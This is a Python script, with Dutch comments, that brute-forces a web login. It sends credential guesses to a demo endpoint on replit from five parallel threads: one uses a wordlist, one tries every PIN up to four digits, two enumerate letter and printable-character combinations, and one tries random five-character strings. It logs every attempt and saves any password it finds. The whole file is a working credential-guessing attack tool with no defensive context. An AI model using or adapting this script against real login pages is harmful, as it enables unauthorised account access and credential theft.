import requests
import random
from threading import Thread, Lock
import os
import itertools
import string

url = "https://requestswebsite.notanothercoder.repl.co/confirm-login"
username = 'username'

# Voeg deze lijn toe buiten alle functies om een Lock object te maken
tries_lock = Lock()

def send_request(username, password):
    data = {
        "username" : username,
        "password" : password
    }

    r = requests.get(url, data=data)
    return r

def uitlezen():
    with open("passwoorden.txt", "r") as f:
        goedpasswoordlijst = []
        passwoord = f.readlines()
        for woord in passwoord:
            goedpasswoordlijst.append(woord.strip())
        return goedpasswoordlijst
    
def generate_pin_codes():
    pin_lengths = [1, 2, 3, 4]
    secure_pins = []

    for length in pin_lengths:
        pin_combinations = itertools.product(range(10), repeat=length)
        for pin in pin_combinations:
            secure_pins.append(''.join(map(str, pin)))
    return secure_pins

def main1():
    passwd = uitlezen() 
    while True:
        if "correct_pass.txt" in os.listdir():
            break
        valid = False
        while not valid:
            with tries_lock:
                file = open("tries.txt", 'r')
                tries = file.read()
                file.close()
            valid = all(password not in tries for password in passwd)
        for password in passwd:
            if "correct_pass.txt" in os.listdir():
                break
            r = send_request(username, password)

            if 'failed to login' in r.text.lower():
                with tries_lock:
                    with open("tries.txt", "a") as f:
                        f.write(f"{password}\n")
                print(f"Incorrect {password}\n")
            else:
                print(f"Correct Password {password}\n")
                with open("correct_pass.txt", "w") as f:
                    f.write(password)
                return

def main2():
    passwd = generate_pin_codes() 
    while True:
        if "correct_pass.txt" in os.listdir():
            break
        valid = False
        while not valid:
            with tries_lock:
                file = open("tries.txt", 'r')
                tries = file.read()
                file.close()
            valid = all(password not in tries for password in passwd)
        for password in passwd:
            if "correct_pass.txt" in os.listdir():
                break
            r = send_request(username, password)

            if 'failed to login' in r.text.lower():
                with tries_lock:
                    with open("tries.txt", "a") as f:
                        f.write(f"{password}\n")
                print(f"Incorrect {password}\n")
            else:
                print(f"Correct Password {password}\n")
                with open("correct_pass.txt", "w") as f:
                    f.write(password)
                return

def main3():
    alphabet = string.ascii_letters
    for length in range(1, 9):
        combo = itertools.product(alphabet, repeat=length)
        for item in combo:
            passwd = ''.join(item)

            if "correct_pass.txt" in os.listdir():
                break  # Stop de huidige iteratie als correct_pass.txt is gevonden

            valid = False
            while not valid:
                with tries_lock:
                    file = open("tries.txt", 'r')
                    tries = file.read()
                    file.close()

                if passwd in tries:
                    break  # Stop de huidige iteratie als het wachtwoord al is geprobeerd
                else:
                    valid = True

                    r = send_request(username, passwd)

                    if 'failed to login' in r.text.lower():
                        with tries_lock:
                            with open("tries.txt", "a") as f:
                                f.write(f"{passwd}\n")
                        print(f"Incorrect {passwd}\n")
                    else:
                        print(f"Correct Password {passwd}\n")
                        with open("correct_pass.txt", "w") as f:
                            f.write(passwd)
                        return  # Stop de functie als het juiste wachtwoord is gevonden


def main4():
    while True:
        if "correct_pass.txt" in os.listdir():
            break

        toetsenbord_tekens = string.printable
        for length in itertools.count(start=1):
            combo = itertools.product(toetsenbord_tekens, repeat=length)
            for item in combo:
                passwd = ''.join(item)

                if "correct_pass.txt" in os.listdir():
                    return  # Stop de functie als correct_pass.txt is gevonden

                valid = False
                while not valid:
                    with tries_lock:
                        with open("tries.txt", 'r') as file:
                            tries = file.read()

                    if passwd in tries:
                        break  # Stop de huidige iteratie als het wachtwoord al is geprobeerd
                    else:
                        valid = True

                        r = send_request(username, passwd)

                        if 'failed to login' in r.text.lower():
                            with tries_lock:
                                with open("tries.txt", "a") as f:
                                    f.write(f"{passwd}\n")
                            print(f"Incorrect {passwd}\n")
                        else:
                            print(f"Correct Password {passwd}\n")
                            with open("correct_pass.txt", "w") as f:
                                f.write(passwd)
                            return  # Stop de functie als het juiste wachtwoord is gevonden


chars = "abcdefghijklmnopqrstuvwxyz0123456789"

def main5():
    while True:
        if "correct_pass.txt" in os.listdir():
            break
        valid = False
        while not valid:
            rndpasswd = random.choices(chars, k=5)
            passwd = "".join(rndpasswd)
            with tries_lock:
                file = open("tries.txt", 'r')
                tries = file.read()
                file.close()
            if passwd in tries:
                pass
            else:
                valid = True
            
            r = send_request(username, passwd)

            if 'failed to login' in r.text.lower():
                with tries_lock:
                    with open("tries.txt", "a") as f:
                        f.write(f"{passwd}\n")
                        f.close()
                print(f"Incorrect {passwd}\n")
            else:
                print(f"Correct Password {passwd}\n")
                with open("correct_pass.txt", "w") as f:
                    f.write(passwd)
                break

if __name__ == "__main__":
    Thread(target=main1).start()
    Thread(target=main2).start()
    Thread(target=main3).start()
    Thread(target=main4).start()
    Thread(target=main5).start()
